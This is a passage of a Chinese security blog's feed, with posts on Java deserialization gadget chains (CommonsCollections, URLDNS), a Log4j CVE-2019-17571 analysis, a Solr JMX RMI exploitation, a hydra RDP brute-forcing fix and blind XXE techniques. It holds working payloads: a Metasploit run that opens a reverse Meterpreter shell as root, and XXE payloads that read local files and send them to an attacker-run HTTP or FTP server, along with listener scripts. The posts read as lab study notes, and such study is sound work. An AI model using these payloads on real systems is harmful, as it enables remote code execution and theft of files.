class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map lazyMap = LazyMap.decorate(innermap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化AnnotationInvocationHandler，传入特殊构造的lazyMap</span></span><br><span class="line"><span class="comment">//这个AnnotationInvocationHandler实例，是作为动态代理的handler，</span></span><br><span class="line"><span class="comment">//所以，当执行代理对象的接口方法时，会关联到 handler 的 invoke 方法去执行</span></span><br><span class="line">Constructor handler_constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,lazyMap); <span class="comment">//创建第一个代理的handler</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用之前的 handler 处理动态代理 Map 对象</span></span><br><span class="line">Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,map_handler); <span class="comment">//创建proxy对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里的AnnotationInvocationHandler是作为反序列化 readObject 的入口点</span></span><br><span class="line">Constructor AnnotationInvocationHandler_Constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">AnnotationInvocationHandler_Constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);</span><br></pre></td></tr></table></figure></p><p><img src="http://x-f1v3.github.io/images/1604563382564.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Commonscollections 系列反序列化学习&lt;br&gt;
    
    </summary>
    
      <category term="Java代码审计" scheme="http://x-f1v3.github.io/categories/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java" scheme="http://x-f1v3.github.io/tags/Java/"/>
    
      <category term="代码审计" scheme="http://x-f1v3.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="反序列化" scheme="http://x-f1v3.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>URLDNS 反序列化</title>
    <link href="http://x-f1v3.github.io//blog/1597283762460.html"/>
    <id>http://x-f1v3.github.io//blog/1597283762460.html</id>
    <published>2020-08-13T01:56:02.000Z</published>
    <updated>2020-08-13T02:29:56.995Z</updated>
    
    <content type="html"><![CDATA[<p>URLDNS 反序列化<br><a id="more"></a></p><h2 id="触发流程"><a href="#触发流程" class="headerlink" title="触发流程"></a>触发流程</h2><p>利用链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">  HashMap.putVal()</span><br><span class="line">    HashMap.hash()</span><br><span class="line">      URL.hashCode()</span><br></pre></td></tr></table></figure></p><p>调试分析，重点看到 <code>HashMap#readObject</code> 的 <code>putVal</code> 方法：<br><img src="http://x-f1v3.github.io/images/1597284283001.png" alt="image"></p><p>调用 <code>hash()</code> 来处理 key,看到 <code>hash()</code> 方法：<br><img src="http://x-f1v3.github.io/images/1597284300345.png" alt="image"></p><p>调用 key 的 <code>hashCode()</code> 方法，跳到 <code>URL</code> 类的 <code>hashCode()</code><br><img src="http://x-f1v3.github.io/images/1597284318196.png" alt="image"></p><p>如果 <code>hashCode</code> 等于 <code>-1</code> ,就会调用 <code>handler.hashCode</code> 方法，这里的 <code>handler</code> 是指 <code>URLStreamHandler</code>,来到 <code>URLStreamHandler.hashCode</code> 方法：<br><img src="http://x-f1v3.github.io/images/1597284330939.png" alt="image"></p><p>该方法对 <code>http</code> 协议的各个部分计算 <code>hashCode</code>，其中 <code>getHostAddress</code> 方法就是 DNS 的触发点。跟进该方法：<br><img src="http://x-f1v3.github.io/images/1597284342470.png" alt="image"></p><p>其中的 <code>InetAddress.getByName(host)</code> 方法对域名发起了 DNS 查询。</p><p>分析完反序列化原理，反过来推 payload.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();  // 创建HashMap，并在 key 处设置 URL 类</span><br><span class="line">URL url = new URL(&quot;http://xxx.xx.xx&quot;);  //创建 URL 类</span><br><span class="line">Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;); //获取 URL 类的 hashCode 变量</span><br><span class="line">f.setAccessible(true); //设置权限</span><br><span class="line">hashMap.put(url, &quot;1&quot;); //放入 HashMap</span><br><span class="line">f.set(url, -1);   //设置 HashCode 为-1，之前的分析，如果HashCode不是-1，不会调用 handler.hashCode 重新计算 HashCode</span><br><span class="line">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;tmp.cer&quot;));</span><br><span class="line">oos.writeObject(hashMap); //序列化写入文件</span><br></pre></td></tr></table></figure></p><p>最开始的设想是这样的，但是实际运行之后，发现会有2次 DNS 记录，分析原因是 <code>hashMap.put(url, &quot;1&quot;);</code> 这里同样会调用 <code>putVal</code> 方法，再走一遍上述流程，<br><img src="http://x-f1v3.github.io/images/1597284351253.png" alt="image"></p><p>所以在 <code>put</code> 之前也要更改 <code>HashCode</code> 为不是-1的值，这样就不会调用  <code>handler.hashCode</code> 计算 <code>hashcode</code>.<br>最后的 payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();  // 创建HashMap，并在 key 处设置 URL 类</span><br><span class="line">URL url = new URL(&quot;http://xxx.xx.xx&quot;);   //创建 URL 类</span><br><span class="line">Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);  //获取 URL 类的 hashCode 变量</span><br><span class="line">f.setAccessible(true); //设置权限</span><br><span class="line">f.set(url, -122); //HashCode不是-1，不会调用 handler.hashCode 重新计算 HashCode </span><br><span class="line">hashMap.put(url, &quot;1&quot;); //放入 HashMap</span><br><span class="line">f.set(url, -1);  //设置 HashCode 为-1，之前的分析，如果HashCode不是-1，不会调用 handler.hashCode 重新计算 HashCode</span><br><span class="line"> ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;tmp.cer&quot;));</span><br><span class="line">oos.writeObject(hashMap); //序列化写入文件</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;URLDNS 反序列化&lt;br&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://x-f1v3.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Java" scheme="http://x-f1v3.github.io/tags/Java/"/>
    
      <category term="反序列化" scheme="http://x-f1v3.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-17571</title>
    <link href="http://x-f1v3.github.io//blog/1577679142463.html"/>
    <id>http://x-f1v3.github.io//blog/1577679142463.html</id>
    <published>2019-12-30T04:12:22.000Z</published>
    <updated>2019-12-30T04:23:11.786Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2019-17571/Apache Log4j 反序列化远程代码执行漏洞<br><a id="more"></a></p><p>用的是 <code>Apache Log4j 1.2.17</code> 版本，<code>sink</code> 在 <code>org.apache.log4j.net.SocketNode</code> 类中：</p><p><img src="http://x-f1v3.github.io/images/1577679232280.png" alt="image"></p><p>在构造函数中，传入 socket 传输的数据流，然后在 <code>run</code> 方法中直接调用 <code>readObject()</code> 反序列化。</p><p>查找在哪些类中会调用 <code>SocketNode</code> 类，发现 <code>SocketServer</code>、<code>SimpleSocketServer</code> 类中都有调用：<br><img src="http://x-f1v3.github.io/images/1577679244091.png" alt="image"></p><p><img src="http://x-f1v3.github.io/images/1577679259398.png" alt="image"></p><p>并且由于 <code>SocketNode</code> 是实现 <code>Runnable</code> 接口。所以通过 <code>new Thread().start()</code> 方法能执行其 <code>run</code> 方法造成反序列化代码执行漏洞。</p><p>复现漏洞可以通过调用 <code>SocketServer</code>、<code>SimpleSocketServer</code> 类，或者自己实现都可以。</p><p>当然，任意代码执行的话还需要调用其他可以的 <code>gadget</code> .比如 <code>Jdk7u21</code>、<code>CommonsCollections1</code> 之类的。</p><p><img src="http://x-f1v3.github.io/images/1577679266375.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CVE-2019-17571/Apache Log4j 反序列化远程代码执行漏洞&lt;br&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://x-f1v3.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="反序列化" scheme="http://x-f1v3.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>攻击JMX RMI</title>
    <link href="http://x-f1v3.github.io//blog/1575618238391.html"/>
    <id>http://x-f1v3.github.io//blog/1575618238391.html</id>
    <published>2019-12-06T07:43:58.000Z</published>
    <updated>2020-11-05T08:08:09.750Z</updated>
    
    <content type="html"><![CDATA[<p>以 Apache Solr 远程代码执行(CVE-2019-12409)为例。<br><a id="more"></a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载 8.1.1 版本，结果发现在 solr.in.cmd 默认是 <code>false</code> ，只有在 solr.in.sh 默认才是 <code>true</code>，所以只有在 Linux 上才能触发。<br><img src="http://x-f1v3.github.io/images/1575618795308.png" alt="image"><br><img src="http://x-f1v3.github.io/images/1575618883028.png" alt="image"></p><p>在 bin 目录下运行 <code>./solr start</code> 启动 solr<br><img src="http://x-f1v3.github.io/images/1575618943864.png" alt="image"></p><p>可以看到默认情况下 <code>18983</code> 是开启的<br><img src="http://x-f1v3.github.io/images/1575618983432.png" alt="image"></p><h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><p>扫描端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -sV -p 18983 127.0.0.1</span><br></pre></td></tr></table></figure></p><p><img src="http://x-f1v3.github.io/images/1575619076487.png" alt="image"></p><p>如果是未授权的话，可以直接连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jconsole  127.0.0.1:18983</span><br></pre></td></tr></table></figure></p><p><img src="http://x-f1v3.github.io/images/1575619146604.png" alt="image"></p><p>比较奇怪的是，用 msf 检测漏洞是否存在的时候，没有检测出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/misc/java_rmi_server</span><br></pre></td></tr></table></figure></p><p><img src="http://x-f1v3.github.io/images/1575619247197.png" alt="image"></p><p>用 nmap 脚本也没有检测出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=rmi-vuln-classloader -p 18983 127.0.0.1</span><br></pre></td></tr></table></figure></p><p><img src="http://x-f1v3.github.io/images/1575619340303.png" alt="image"></p><p>尴尬….</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="mjet"><a href="#mjet" class="headerlink" title="mjet"></a>mjet</h3><p>下载 <a href="https://github.com/x-f1v3/mjet" target="_blank" rel="noopener">mjet.py</a> 脚本。<br>因为开启的 jmx 服务默认是不需要验证的，所以直接利用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">../jdk1.8/bin/java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 18983 install passwd http://127.0.0.1:8000  8000</span><br><span class="line"></span><br><span class="line">../jdk1.8/bin/java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 18983 command passwd &quot;whoami&quot;</span><br></pre></td></tr></table></figure></p><p><img src="http://x-f1v3.github.io/images/1575619589642.png" alt="image"></p><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>利用 <code>exploit/multi/misc/java_jmx_server</code> 模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use java/meterpreter/reverse_tcp</span><br><span class="line">msf payload(java/meterpreter/reverse_tcp) &gt; set LHOST 127.0.0.1</span><br><span class="line">LHOST =&gt; 127.0.0.1</span><br><span class="line">msf payload(java/meterpreter/reverse_tcp) &gt; set LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf payload(java/meterpreter/reverse_tcp) &gt; use exploit/multi/misc/java_jmx_server</span><br><span class="line">msf exploit(multi/misc/java_jmx_server) &gt; set RHOST 127.0.0.1</span><br><span class="line">RHOST =&gt; 127.0.0.1</span><br><span class="line">msf exploit(multi/misc/java_jmx_server) &gt; set RPORT 18983</span><br><span class="line">RPORT =&gt; 18983</span><br><span class="line">msf exploit(multi/misc/java_jmx_server) &gt; run</span><br><span class="line"></span><br><span class="line">[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?</span><br><span class="line">[*] Started reverse TCP handler on 127.0.0.1:4444 </span><br><span class="line">[*] 127.0.0.1:18983 - Using URL: http://0.0.0.0:8080/ka4B2HQsM</span><br><span class="line">[*] 127.0.0.1:18983 - Local IP: http://172.16.65.171:8080/ka4B2HQsM</span><br><span class="line">[*] 127.0.0.1:18983 - Sending RMI Header...</span><br><span class="line">[*] 127.0.0.1:18983 - Discovering the JMXRMI endpoint...</span><br><span class="line">[+] 127.0.0.1:18983 - JMXRMI endpoint on 127.0.1.1:18983</span><br><span class="line">[*] 127.0.0.1:18983 - Proceeding with handshake...</span><br><span class="line">[+] 127.0.0.1:18983 - Handshake with JMX MBean server on 127.0.1.1:18983</span><br><span class="line">[*] 127.0.0.1:18983 - Loading payload...</span><br><span class="line">[*] 127.0.0.1:18983 - Replied to request for mlet</span><br><span class="line">[*] 127.0.0.1:18983 - Replied to request for payload JAR</span><br><span class="line">[*] 127.0.0.1:18983 - Executing payload...</span><br><span class="line">[*] 127.0.0.1:18983 - Replied to request for payload JAR</span><br><span class="line">[*] Sending stage (53837 bytes) to 127.0.0.1</span><br><span class="line">[*] Meterpreter session 1 opened (127.0.0.1:4444 -&gt; 127.0.0.1:40740) at 2019-12-06 14:20:04 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p><img src="http://x-f1v3.github.io/images/1575619715922.png" alt="image"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.optiv.com/blog/exploiting-jmx-rmi" target="_blank" rel="noopener">Exploiting JMX RMI</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以 Apache Solr 远程代码执行(CVE-2019-12409)为例。&lt;br&gt;
    
    </summary>
    
      <category term="漏洞利用" scheme="http://x-f1v3.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="反序列化" scheme="http://x-f1v3.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>hydra问题</title>
    <link href="http://x-f1v3.github.io//blog/1573541964775.html"/>
    <id>http://x-f1v3.github.io//blog/1573541964775.html</id>
    <published>2019-11-12T06:59:24.000Z</published>
    <updated>2019-11-12T07:24:59.904Z</updated>
    
    <content type="html"><![CDATA[<p>Kali2.0里面的hydra是8.6版本的，在测试爆破3389时，能够正常运行，但是爆不出测试机的正确密码。<br><a id="more"></a></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在Kali2.0上用hydra测试爆破3389时，爆破不出测试机的正确密码。一直在跳：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[STATUS] 1.00 tries/min, 5 tries in 00:00h, 0 to do in 03:00h, 1 active</span><br><span class="line">[STATUS] 0.83 tries/min, 5 tries in 00:00h, 0 to do in 03:00h, 1 active</span><br><span class="line">[STATUS] 0.56 tries/min, 5 tries in 00:00h, 0 to do in 03:00h, 1 active</span><br><span class="line">[STATUS] 0.36 tries/min, 5 tries in 00:00h, 0 to do in 03:00h, 1 active</span><br><span class="line">[STATUS] 0.33 tries/min, 5 tries in 00:00h, 0 to do in 03:00h, 1 active</span><br></pre></td></tr></table></figure></p><p>不知道啥意思，反正是爆破不出来，肯定有问题。</p><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>想着是不是版本太低了，升级了一下，把hydra升级到当时的最新版本：<code>apt install hydra</code><br>跑了之后结果是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ERROR] Compiled without FREERDP2 support, module not available!</span><br></pre></td></tr></table></figure></p><p>emmm,貌似少了一个模块，本来想安装这个模块的，但是看了下，安装太慢，而且太麻烦了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/FreeRDP/FreeRDP</span><br></pre></td></tr></table></figure></p><p>别人的安装记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/86638f0e89d7</span><br></pre></td></tr></table></figure></p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>还是到处搜啊，在Google上搜索到了其他人提交的<code>issue</code>：<a href="https://github.com/vanhauser-thc/thc-hydra/issues/420" target="_blank" rel="noopener">I have error with [ERROR] Compiled without FREERDP2 support, module not available! </a></p><p>编译安装最新版hydra，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vanhauser-thc/thc-hydra.git</span><br><span class="line">cd thc-hydra</span><br><span class="line">sudo apt install freerdp2-dev</span><br><span class="line">make clean</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></p><p>在kali2.0上测试成功。<br><img src="http://x-f1v3.github.io/images/1573543195446.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Kali2.0里面的hydra是8.6版本的，在测试爆破3389时，能够正常运行，但是爆不出测试机的正确密码。&lt;br&gt;
    
    </summary>
    
      <category term="工具" scheme="http://x-f1v3.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="hydra" scheme="http://x-f1v3.github.io/tags/hydra/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞</title>
    <link href="http://x-f1v3.github.io//blog/1561960885122.html"/>
    <id>http://x-f1v3.github.io//blog/1561960885122.html</id>
    <published>2019-07-01T06:01:25.000Z</published>
    <updated>2020-11-05T08:07:43.391Z</updated>
    
    <content type="html"><![CDATA[<p>最近经常碰到XXE漏洞，记录一下XXE的相关姿势和碰到的问题<br><a id="more"></a></p><h2 id="Blind-XXE-payload"><a href="#Blind-XXE-payload" class="headerlink" title="Blind XXE payload"></a>Blind XXE payload</h2><h3 id="通过ftp传输数据"><a href="#通过ftp传输数据" class="headerlink" title="通过ftp传输数据"></a>通过ftp传输数据</h3><h4 id="相关paylaod"><a href="#相关paylaod" class="headerlink" title="相关paylaod"></a>相关paylaod</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">request:</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://ip/111.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">111.dtd:</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % payload SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;ftp://fakeuser:fakepass@ip/%payload;&apos;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">request:</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///C:/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://192.168.150.1/evil.xml&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line"> %all;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">evil.xml:</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &apos;http://192.168.150.1/1.php?file=%file;&apos;&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &apos;ftp://ip:8089/%file;&apos;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">-----------------------</span><br><span class="line">request:</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://ip/111.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">111.dtd</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % payload SYSTEM &quot;file:///c:/Windows/win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;ftp://ip:8089/%payload;&apos;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure><h4 id="伪装ftp服务"><a href="#伪装ftp服务" class="headerlink" title="伪装ftp服务"></a>伪装ftp服务</h4><p>方法一：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">1.py</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">host = &quot;0.0.0.0&quot;</span><br><span class="line">port = 2121</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.bind((host, port))</span><br><span class="line">sock.listen(1)</span><br><span class="line"></span><br><span class="line">print &apos;waiting for connection...&apos;</span><br><span class="line"></span><br><span class="line">(client_sock, client_addr) = sock.accept()</span><br><span class="line"></span><br><span class="line">client_sock.send(&quot;220 test\r\n&quot;)</span><br><span class="line">print &apos;start&apos;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">  msg = client_sock.recv(1024)</span><br><span class="line">  msg = msg.rstrip()</span><br><span class="line"></span><br><span class="line">  if msg == &quot;&quot;:</span><br><span class="line">    print &apos;connection end&apos;</span><br><span class="line">    break</span><br><span class="line">  else:</span><br><span class="line">    if msg.startswith(&quot;USER &quot;):</span><br><span class="line">       client_sock.send(&quot;331 user \r\n&quot;)</span><br><span class="line">       print &quot;echo : %s&quot; % msg</span><br><span class="line">    elif msg.startswith(&quot;PASS &quot;):</span><br><span class="line">       client_sock.send(&quot;230 pass\r\n&quot;)</span><br><span class="line">       print &quot;echo : %s&quot; % msg</span><br><span class="line">    elif msg.startswith(&quot;TYPE &quot;):</span><br><span class="line">       client_sock.send(&quot;200 mode\r\n&quot;)</span><br><span class="line">       print &quot;echo : %s&quot; % msg</span><br><span class="line">    else:</span><br><span class="line">       client_sock.send(&quot;200 OK\r\n&quot;)</span><br><span class="line">       print &quot;echo : %s&quot; % msg</span><br><span class="line"></span><br><span class="line">client_sock.close()</span><br><span class="line"></span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure></p><p>方法二：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pyftpdlib -p 21</span><br></pre></td></tr></table></figure></p><p>方法三：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.rb</span><br><span class="line"></span><br><span class="line">https://raw.githubusercontent.com/ONsec-Lab/scripts/master/xxe-ftp-server.rb</span><br></pre></td></tr></table></figure></p><p>方法四<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1.rb</span><br><span class="line"></span><br><span class="line">require &apos;socket&apos;</span><br><span class="line">server = TCPServer.new 2121</span><br><span class="line">loop do</span><br><span class="line">  Thread.start(server.accept) do |client|</span><br><span class="line">    puts &quot;New client connected&quot;</span><br><span class="line">    data = &quot;&quot;</span><br><span class="line">    client.puts(&quot;220 xxe-ftp-server&quot;)</span><br><span class="line">    loop &#123;</span><br><span class="line">        req = client.gets()</span><br><span class="line">        puts &quot;&lt; &quot;+req</span><br><span class="line">        if req.include? &quot;USER&quot;</span><br><span class="line">            client.puts(&quot;331 password please - version check&quot;)</span><br><span class="line">        else</span><br><span class="line">           #puts &quot;&gt; 230 more data please!&quot;</span><br><span class="line">            client.puts(&quot;230 more data please!&quot;)</span><br><span class="line">        end</span><br><span class="line">    &#125;</span><br><span class="line">  end</span><br><span 